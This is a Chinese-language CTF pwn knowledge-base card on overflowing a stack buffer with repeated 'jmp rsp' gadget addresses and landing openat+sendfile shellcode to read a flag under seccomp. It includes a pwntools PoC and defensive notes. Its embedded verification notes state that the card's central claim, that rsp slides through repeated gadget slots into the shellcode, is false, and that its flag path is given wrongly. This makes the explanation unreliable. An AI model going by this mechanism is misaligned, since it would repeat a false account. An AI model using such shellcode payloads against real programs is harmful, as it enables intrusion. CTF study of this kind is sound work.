---
id: ctf-pwn-shellcode-landing-jmp-rsp-repeat-padding-openat-sendfile
title: 栈偏移算不准时用同一个 jmp rsp gadget 铺满整个溢出区：rsp 落到哪一格都会滑到尾部 shellcode，配 openat+sendfile 的 ORW 读文件
type: scenario
domain: ctf
path: ctf/pwn
technique: shellcode-landing-jmp-rsp-repeat-padding-openat-sendfile-orw
tags:
- ctf
- pwn
- shellcode
- jmp-rsp
- stack-overflow
- orw
- seccomp
- amd64
cve: []
severity: low
confidence: high
status: draft
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W2
  verified_at: '2026-11-08T18:33:22+08:00'
  notes: 已对照原文核对；本次核对未读取图片；openat(AT_FDCWD=-100)+sendfile(1,fd,NULL,0x100) 与 jmp rsp gadget 0x400818 与原文 exp 一致。但核心机制描述有误：原文 pay=p64(magic)*6+payload1 是精确偏移填充（leave;ret 后 pop rbp/ret 吃掉前几格，rsp 最终指向第 6 格后的 shellcode），且 jmp rsp 跳的是 rsp 处的内容（那几个地址字节）而不是在重复填充区逐格滑行，卡中「rsp 落到哪一格都会跳回同一段 gadget 直到越过最后一格」不成立；另 shellcode 常量 0x67616c662f2e 实为 ./flag，卡中写作 /.flag。未验证点：未在本机执行 exp
url: /docs/ctf/pwn/ctf-pwn-shellcode-landing-jmp-rsp-repeat-padding-openat-sendfile/
draft: false
kb_aliases:
- jmp rsp 铺满
- gadget 重复填充偏移免疫
- shellcode 落地对齐
- openat sendfile ORW
- seccomp 禁 execve 读 flag
---

## 一句话结论

溢出之后 `rsp` 究竟停在缓冲区第几个 qword，常受读入长度、canary 槽、编译器对齐与栈迁移影响而算不准；与其死磕偏移，不如把 `jmp rsp`（或以它结尾的短 gadget）重复铺满整个溢出区——`rsp` 无论落在哪一格都会立刻跳回同一段 gadget，直到越过最后一格进入尾部拼接的 shellcode。seccomp 禁掉 `execve` 时，shellcode 用 `openat(AT_FDCWD, path, 0) + sendfile(1, fd, NULL, n)` 一条链把 flag 直接送到 stdout。

## 原理

- **`jmp rsp` 的“自稳定”**：该指令把控制流交给 `rsp` 当前指向的那 8 个字节。若该内容又是一个 `jmp rsp` 地址，控制流就停在原地反复跳，不消费栈；只有当 `rsp` 因某次 `ret`/`pop` 前进到“非 gadget 地址”时才真正离开。因此“铺满”等价于把“必须精确命中一格”放宽成“只要落在这段区域里”。
- **为什么偏移会算不准**：读入长度由攻击者控制（`read(0, buf, 0x100)`），栈帧中缓冲区到返回地址的距离受 `-fstack-protector` 的 canary 槽、栈对齐、内联/红区影响；若前置步骤还用 `leave; ret` 迁移过栈，`rbp` 来自上一轮输入，偏移更难固定。
- **与精确覆盖路线的取舍**：精确写法是 `p64(0)*k + p64(jmp_rsp) + shellcode`，字节最省但偏移错一格就崩；铺满写法是 `p64(gadget)*n + shellcode`，多花几十字节，换来对 ±1 格偏差的容忍。前提是溢出长度足够（本例 `0x100`）。
- **为什么用 openat 而不是 open**：`openat` 的目录 fd 参数可以传 `AT_FDCWD = -100`，用 `xor rdi,rdi; sub rdi,100` 两条短指令得到负立即数，避开在 shellcode 里塞大整数与零字节；路径压栈后用 `mov rsi,rsp` 传指针。它在 seccomp 白名单里通常与 `open` 同等放行，而 `execve` 被显式禁掉时这是唯一读文件的现实路径。
- **为什么用 sendfile**：一次系统调用完成“从 fd 读到写出”，不必先 `read` 到缓冲区再 `write`；`sendfile(out_fd=1, in_fd=fd, offset=NULL, count=n)` 直接把文件内容灌进 socket/stdout。代价是 `in_fd` 需已知，稳妥做法是把 `openat` 的返回值 `rax` 传给 `rsi`。

## 触发条件

- 程序把用户输入读到返回地址附近，且读入长度足以容纳“多个 gadget + shellcode”。
- 程序内存在 `jmp rsp` 或以 `jmp rsp` 结尾的短 gadget（`FF E4` / `55 48 89 E5 FF E4` 等）。
- 栈可执行或未开 NX（否则需先 `mprotect` 或改走纯 ROP）。
- seccomp 禁了 `execve`，但放行 `openat` 与 `sendfile`。
- `rsp` 落地偏移不确定，或希望利用脚本对偏移变化免疫。

## 利用步骤

1. 逆向确认读入点、长度上限与可用的 `jmp rsp` 类 gadget 地址。
2. 用任意写/一次跳转把控制流先导到“能溢出”的函数（本类题常见做法是先把 `__stack_chk_fail@got` 改写成 `leave; ret`，详见关联卡）。
3. 估算铺满格数 `n`：从缓冲区起点到返回地址的 qword 数，多铺 1~2 格无副作用（只会多跳几次）。
4. 用 pwntools `asm()` 写 ORW shellcode：`openat(-100, "/.flag", 0)` → 把 `rax` 作为 `in_fd` → `sendfile(1, fd, NULL, 0x100)`。
5. 发送 `p64(gadget)*n + shellcode`；若没有回显，先把 `n` 加减 1 再试，再检查路径与 `count`。
6. 若输出被截断，把 `count` 调大或用循环 `sendfile` 直到返回 0；若 flag 较长且 stdout 有缓冲，可在 shellcode 末尾补一次 `write` 或让程序自然 flush。

## PoC

```python
from pwn import *
context.clear(arch='amd64', os='linux')

magic = 0x400818     # push rbp; mov rbp, rsp; jmp rsp
n     = 6            # 铺满格数：偏移不确定时多铺几格

shellcode = asm('''
    mov rax, 0x67616c662f2e      /* "/.flag" 的小端形式 */
    push rax
    xor rdi, rdi
    sub rdi, 100                 /* AT_FDCWD */
    mov rsi, rsp                 /* path */
    xor edx, edx                 /* flags = O_RDONLY */
    xor r10, r10
    push SYS_openat
    pop rax
    syscall                      /* openat(AT_FDCWD, "/.flag", 0) */

    mov rdi, 1                   /* stdout */
    mov rsi, rax                 /* in_fd = openat 的返回值，不硬编码 */
    push 0
    mov rdx, rsp                 /* offset = NULL */
    mov r10, 0x100               /* count */
    push SYS_sendfile
    pop rax
    syscall                      /* sendfile(1, fd, NULL, 0x100) */
''')

payload = p64(magic) * n + shellcode
# …前面的任意写/栈迁移略，见关联卡；此处只演示落地段
p.send(payload)
p.interactive()
```

## 变体与关联

- **gadget 变体**：无 `jmp rsp` 时用 `call rsp`、`push rsp; ret`；或铺 `add rsp, X; ret` 把栈“推”过不确定区。
- **ORW 变体**：`open` + `read` + `write`（seccomp 放行老系统调用号时）、`openat2`、`pread64`；无 `sendfile` 时退回 `read`+`write` 两段。
- **关联**：[[ctf-pwn-stack-chk-fail-got-leave-ret-jmp-rsp-shellcode]]（同一类题的“精确偏移”版本：`p64(0)*k + p64(jmp_rsp)`，`__stack_chk_fail` GOT 改法的完整机制在该卡）、[[ctf-pwn-jmp-rsp-gadget-padding-openat-sendfile-orw]] 为同源补充、[[binary-pwn-stack-srop-mprotect-openat-shellcode-seccomp]]（seccomp 更严、无寄存器 gadget 时的 SROP 路线）。
- **边界**：栈不可执行且无 `mprotect` gadget 时铺满法失效；输入按字符串截断（遇 `\x00` 停）时需用无零字节编码的 shellcode；`sendfile` 的 `in_fd` 若硬编码为 3，仅在 `openat` 恰好返回 3 时成立。

## 检测与防御

- **CTF 出题侧**：开 NX + Full RELRO 直接掐死本链；seccomp 同时禁 `sendfile` 可迫使选手改走更复杂的 ORW 或纯 ROP。
- **工程侧**：`-z noexecstack`、`-Wl,-z,relro,-z,now`、启用 CET/Shadow Stack 让 `jmp rsp` 类控制流转移失效；编译期插桩检测“函数返回值被外部输入覆盖”。
- **检测思路**：进程在校验失败/异常信号后未终止而是转入栈上执行；非文件服务进程出现 `openat`/`sendfile` 调用；寄存器直接指向栈顶的可疑执行序列。
